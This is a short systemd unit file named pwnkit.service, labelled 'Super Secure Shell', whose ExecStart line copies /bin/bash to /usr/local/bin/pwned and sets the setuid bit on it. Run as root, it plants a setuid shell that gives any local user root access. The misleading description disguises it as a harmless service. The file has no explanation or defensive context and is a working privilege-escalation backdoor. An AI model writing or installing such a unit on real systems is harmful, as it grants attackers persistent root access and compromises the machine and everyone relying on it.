# pwnkit.service
[Unit]
Description=Super Secure Shell
AllowIsolate=no

[Service]
ExecStart=/bin/bash -c '/usr/bin/cp /bin/bash /usr/local/bin/pwned; /usr/bin/chmod +s /usr/local/bin/pwned'

[Install]
Alias=pwnkit.service
